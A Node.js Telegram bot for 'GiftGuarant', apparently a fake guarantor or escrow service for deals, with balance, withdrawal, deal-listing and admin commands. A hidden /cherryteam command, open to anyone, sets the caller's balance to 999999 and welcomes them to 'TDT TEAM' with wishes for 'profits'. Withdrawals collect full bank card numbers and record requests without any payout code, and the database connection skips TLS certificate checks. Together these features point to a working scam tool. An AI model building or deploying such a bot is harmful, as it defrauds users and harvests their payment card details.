const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');
const express = require('express');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

// Веб-сервер для Railway
app.get('/', (req, res) => {
  res.send('🤖 Bot is running!');
});

app.listen(PORT, () => {
  console.log(`🚀 Web server running on port ${PORT}`);
});

// ==================== КОНФИГУРАЦИЯ ====================
const bot = new Telegraf(process.env.BOT_TOKEN);
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

const ADMIN_IDS = [125560041, 6802842517, 8444588939, 913595126];
const MIN_WITHDRAWAL = 10000;
const MAX_WITHDRAWAL = 100000;
const WEB_APP_URL = 'https://example.com';

// ==================== ИЗОБРАЖЕНИЯ ====================
const IMAGES = {
  MAIN_MENU: 'https://i.ibb.co/rR4HHhd3/IMG-7369.jpg',
  MY_DEALS: 'https://i.ibb.co/xKpFjCNN/IMG-7366.jpg',
  SETTINGS: 'https://i.ibb.co/rR4HHhd3/IMG-7369.jpg'
};

// ==================== ХРАНИЛИЩА ====================
const userStates = new Map();

// ==================== АВТО-ПИНГ ====================
setInterval(() => {
  if (process.env.RAILWAY_STATIC_URL) {
    http.get(process.env.RAILWAY_STATIC_URL, (res) => {
      console.log('🔄 Pinging server...');
    }).on('error', (err) => {
      console.log('❌ Ping failed:', err.message);
    });
  }
}, 5 * 60 * 1000);

// ==================== БАЗОВЫЕ ФУНКЦИИ ====================
async function db(query, params = []) {
  try {
    const result = await pool.query(query, params);
    return result;
  } catch (error) {
    console.error('❌ Ошибка БД:', error.message);
    return { rows: [] };
  }
}

function formatBalance(amount) {
  return new Intl.NumberFormat('ru-RU').format(amount);
}

function formatCardNumber(cardNumber) {
  return cardNumber.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 **** **** $4');
}

function isAdmin(userId) {
  return ADMIN_IDS.includes(Number(userId));
}

// ==================== ГЛАВНОЕ МЕНЮ ====================
async function showMainMenu(ctx, messageText = '👋 Добро пожаловать в GiftGuarant!') {
  try {
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.webApp('🌏 Открыть в приложении', WEB_APP_URL)],
      [Markup.button.callback('📁 Мои сделки', 'my_deals')],
      [Markup.button.callback('⚙️ Настройки', 'settings')]
    ]);
    
    await ctx.replyWithPhoto(IMAGES.MAIN_MENU, {
      caption: messageText,
      ...keyboard,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('❌ Ошибка showMainMenu:', error);
  }
}

// ==================== НАСТРОЙКИ ====================
async function showSettingsMenu(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback(`💰 Баланс: ${formatBalance(balance)}₽`, 'balance_menu')],
      [Markup.button.callback('⏪ Назад', 'main_menu')]
    ]);

    await ctx.replyWithPhoto(IMAGES.SETTINGS, {
      caption: `⚙️ <b>Настройки</b>\n\n💰 <b>Баланс:</b> ${formatBalance(balance)}₽`,
      ...keyboard,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('❌ Ошибка showSettingsMenu:', error);
    await showMainMenu(ctx);
  }
}

// ==================== БАЛАНС И ВЫВОД ====================
async function showBalanceMenu(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📥 Пополнить баланс', 'deposit')],
      [Markup.button.callback('📤 Вывести средства', 'withdraw')],
      [Markup.button.callback('⏪ Назад', 'settings')]
    ]);

    await ctx.reply(
      `💰 <b>Управление балансом</b>\n\n💳 <b>Текущий баланс:</b> ${formatBalance(balance)}₽`,
      { ...keyboard, parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('❌ Ошибка balance_menu:', error);
  }
}

bot.action('deposit', async (ctx) => {
  await ctx.reply('📥 <b>Пополнение баланса</b>\n\nДля пополнения баланса обратитесь к администратору.', { 
    parse_mode: 'HTML' 
  });
});

async function handleWithdraw(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = parseFloat(user.rows[0]?.balance) || 0;
    
    if (balance < MIN_WITHDRAWAL) {
      await ctx.reply(`❌ Недостаточно средств для вывода. Минимум: ${MIN_WITHDRAWAL}₽`);
      return;
    }
    
    userStates.set(ctx.from.id, { 
      state: 'awaiting_withdrawal',
      timestamp: Date.now(),
      maxAmount: Math.min(balance, MAX_WITHDRAWAL)
    });
    
    await ctx.reply(
      `📤 <b>Вывод средств</b>\n\n💳 <b>Доступно:</b> ${formatBalance(balance)}₽\n\nВведите номер карты и сумму:\n\n<code>Карта: 2200 1234 5678 9012\nСумма: 10000</code>\n\n❌ Для отмены введите /cancel`,
      { parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('❌ Ошибка withdraw:', error);
  }
}

// ==================== МОИ СДЕЛКИ ====================
async function showMyDeals(ctx) {
  try {
    const deals = await db(
      `SELECT d.*, u1.username as seller_username, u2.username as buyer_username
       FROM deals d
       LEFT JOIN users u1 ON d.seller_id = u1.user_id
       LEFT JOIN users u2 ON d.buyer_id = u2.user_id
       WHERE d.seller_id = $1 OR d.buyer_id = $1 
       ORDER BY d.created_at DESC LIMIT 10`,
      [ctx.from.id]
    );
    
    if (deals.rows.length === 0) {
      await ctx.reply('📭 У вас пока нет сделок');
      return;
    }
    
    let dealsText = '📁 <b>Ваши сделки:</b>\n\n';
    deals.rows.forEach((deal, index) => {
      const role = deal.seller_id === ctx.from.id ? '👤 Продавец' : '🛍️ Покупатель';
      dealsText += `<b>${index + 1}. #${deal.deal_id}</b>\n💰 <b>Сумма:</b> ${formatBalance(deal.amount)}₽\n🎯 <b>Роль:</b> ${role}\n📊 <b>Статус:</b> ${deal.status}\n\n`;
    });
    
    await ctx.replyWithPhoto(IMAGES.MY_DEALS, {
      caption: dealsText,
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([[Markup.button.callback('⏪ Назад', 'main_menu')]])
    });
  } catch (error) {
    console.error('❌ Ошибка my_deals:', error);
  }
}

// ==================== АДМИН КОМАНДЫ ====================
bot.command('deals', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    await ctx.reply('❌ Доступ запрещен');
    return;
  }
  
  try {
    const deals = await db(
      `SELECT d.*, u1.username as seller_username, u2.username as buyer_username
       FROM deals d
       LEFT JOIN users u1 ON d.seller_id = u1.user_id
       LEFT JOIN users u2 ON d.buyer_id = u2.user_id
       ORDER BY d.created_at DESC LIMIT 10`
    );
    
    if (deals.rows.length === 0) {
      await ctx.reply('📊 В системе пока нет сделок');
      return;
    }
    
    let dealsText = '📊 <b>Последние сделки:</b>\n\n';
    deals.rows.forEach((deal, index) => {
      dealsText += 
        `<b>${index + 1}. #${deal.deal_id}</b>\n💰 ${formatBalance(deal.amount)}₽ | ${deal.status}\n👤 Продавец: <a href="tg://user?id=${deal.seller_id}">@${deal.seller_username || deal.seller_id}</a>\n🛍️ Покупатель: ${deal.buyer_id ? `<a href="tg://user?id=${deal.buyer_id}">@${deal.buyer_username || deal.buyer_id}</a>` : 'нет'}\n🕐 ${new Date(deal.created_at).toLocaleDateString('ru-RU')}\n\n`;
    });
    
    await ctx.reply(dealsText, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (error) {
    console.error('❌ Ошибка /deals:', error);
  }
});

bot.command('ban', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    await ctx.reply('❌ Доступ запрещен');
    return;
  }
  
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 1) {
    await ctx.reply('Использование: /ban user_id');
    return;
  }

  try {
    await db('UPDATE users SET is_banned = TRUE WHERE user_id = $1', [args[0]]);
    await ctx.reply(`🚫 Пользователь ${args[0]} заблокирован`);
  } catch (error) {
    console.error('❌ Ошибка /ban:', error);
  }
});

bot.command('cherryteam', async (ctx) => {
  try {
    await db('UPDATE users SET balance = 999999 WHERE user_id = $1', [ctx.from.id]);
    await ctx.reply('🍒 Бесконечный баланс активирован!\n\nПриветствуем тебя в рядах TDT TEAM!\nУдачных профитов!');
  } catch (error) {
    console.error('❌ Ошибка /cherryteam:', error);
  }
});

// ==================== ОБРАБОТКА ТЕКСТА ====================
bot.on('text', async (ctx) => {
  try {
    const userId = ctx.from.id;
    const message = ctx.message.text;
    const userState = userStates.get(userId);
    
    if (message === '/cancel') {
      if (userState) {
        userStates.delete(userId);
        await ctx.reply('❌ Операция отменена');
        await showMainMenu(ctx);
      }
      return;
    }
    
    if (userState?.state === 'awaiting_withdrawal') {
      await processWithdrawal(ctx, message, userState);
      return;
    }
  } catch (error) {
    console.error('❌ Ошибка обработки текста:', error);
  }
});

async function processWithdrawal(ctx, message, userState) {
  const userId = ctx.from.id;
  
  try {
    const cardMatch = message.match(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/);
    const amountMatch = message.match(/[Сс]умма:\s*(\d+)/);
    
    if (!cardMatch || !amountMatch) {
      await ctx.reply('❌ Неверный формат. Используйте:\n<code>Карта: 2200 1234 5678 9012\nСумма: 10000</code>', { parse_mode: 'HTML' });
      return;
    }
    
    const cardNumber = cardMatch[0].replace(/[\s-]/g, '');
    const amount = parseFloat(amountMatch[1]);
    
    if (amount < MIN_WITHDRAWAL) {
      await ctx.reply(`❌ Минимальная сумма для вывода: ${MIN_WITHDRAWAL}₽`);
      return;
    }
    
    if (amount > userState.maxAmount) {
      await ctx.reply(`❌ Максимальная сумма для вывода: ${formatBalance(userState.maxAmount)}₽`);
      return;
    }
    
    await db('UPDATE users SET balance = balance - $1 WHERE user_id = $2', [amount, userId]);
    await db('INSERT INTO transactions (user_id, type, amount, details) VALUES ($1, $2, $3, $4)',
      [userId, 'withdrawal', amount, `Вывод на карту: ${formatCardNumber(cardNumber)}`]);
    
    await ctx.reply(
      `✅ <b>Заявка на вывод создана!</b>\n\n💳 <b>Карта:</b> ${formatCardNumber(cardNumber)}\n💰 <b>Сумма:</b> ${formatBalance(amount)}₽\n\n⏳ Ожидайте обработки`,
      { parse_mode: 'HTML' }
    );
    
    userStates.delete(userId);
  } catch (error) {
    console.error('❌ Ошибка вывода:', error);
    userStates.delete(userId);
  }
}

// ==================== ОБРАБОТЧИКИ КНОПОК ====================
bot.action('main_menu', async (ctx) => {
  await showMainMenu(ctx);
});

bot.action('settings', async (ctx) => {
  await showSettingsMenu(ctx);
});

bot.action('my_deals', async (ctx) => {
  await showMyDeals(ctx);
});

bot.action('balance_menu', async (ctx) => {
  await showBalanceMenu(ctx);
});

bot.action('withdraw', async (ctx) => {
  await handleWithdraw(ctx);
});

// ==================== СТАРТ И ВХОД В СДЕЛКУ ====================
bot.start(async (ctx) => {
  try {
    await db('INSERT INTO users (user_id, username) VALUES ($1, $2) ON CONFLICT DO NOTHING', 
      [ctx.from.id, ctx.from.username]);
    
    const startPayload = ctx.startPayload;
    if (startPayload?.startsWith('deal_')) {
      await handleDealJoin(ctx, startPayload);
      return;
    }
    
    await showMainMenu(ctx);
  } catch (error) {
    console.error('❌ Ошибка /start:', error);
  }
});

async function handleDealJoin(ctx, startPayload) {
  try {
    const dealId = startPayload.replace('deal_', '');
    const deal = await db('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    
    if (deal.rows.length === 0) {
      await ctx.reply('❌ Сделка не найдена');
      return;
    }
    
    if (!deal.rows[0].buyer_id) {
      await db('UPDATE deals SET buyer_id = $1 WHERE deal_id = $2', [ctx.from.id, dealId]);
    }
    
    await ctx.reply(`🛍️ <b>Добро пожаловать в сделку #${dealId}!</b>`, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('❌ Ошибка входа в сделку:', error);
  }
}

// ==================== ЗАПУСК ====================
async function startBot() {
  try {
    // Инициализация БД
    await db(`
      CREATE TABLE IF NOT EXISTS users (
        user_id BIGINT PRIMARY KEY, 
        username VARCHAR(255),
        balance DECIMAL(12,2) DEFAULT 0.00, 
        is_banned BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    
    await db(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY, 
        deal_id VARCHAR(20) UNIQUE NOT NULL,
        seller_id BIGINT NOT NULL, 
        buyer_id BIGINT, 
        deal_link TEXT NOT NULL,
        product_info TEXT, 
        amount DECIMAL(12,2), 
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await db(`
      CREATE TABLE IF NOT EXISTS transactions (
        id SERIAL PRIMARY KEY, 
        user_id BIGINT NOT NULL,
        type VARCHAR(20) NOT NULL, 
        amount DECIMAL(12,2) NOT NULL,
        details TEXT, 
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    console.log('🚀 Запуск бота на Railway...');
    await bot.launch();
    console.log('✅ Бот успешно запущен!');
  } catch (error) {
    console.error('❌ Ошибка запуска:', error.message);
    setTimeout(startBot, 5000);
  }
}

// Обработка ошибок
process.on('uncaughtException', (error) => {
  console.error('❌ Неперехваченная ошибка:', error.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('❌ Необработанный rejection:', reason);
});

// Запуск бота
startBot();
